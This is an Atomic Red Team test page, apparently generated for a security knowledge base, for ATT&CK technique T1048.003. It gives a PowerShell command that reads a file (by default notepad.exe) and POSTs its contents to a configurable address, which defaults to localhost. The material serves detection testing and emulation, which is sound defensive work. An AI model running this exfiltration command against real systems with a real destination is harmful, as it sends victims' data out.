---
atomic_guid: "6aa58451-1121-4490-a8e9-1dada3f1c68c"
title: "Exfiltration Over Alternative Protocol - HTTP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "6aa58451-1121-4490-a8e9-1dada3f1c68c"
  - "Exfiltration Over Alternative Protocol - HTTP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - HTTP

Exfiltration of specified file over HTTP.
Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.

## Metadata

- Atomic GUID: 6aa58451-1121-4490-a8e9-1dada3f1c68c
- Technique: T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1048.003/T1048.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]

## Input Arguments

### input_file

- description: Path to file to exfiltrate
- type: path
- default: C:\Windows\System32\notepad.exe

### ip_address

- description: Destination IP address where the data should be sent
- type: string
- default: http://127.0.0.1

## Executor

- name: powershell

### Command

```powershell
$content = Get-Content #{input_file}
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
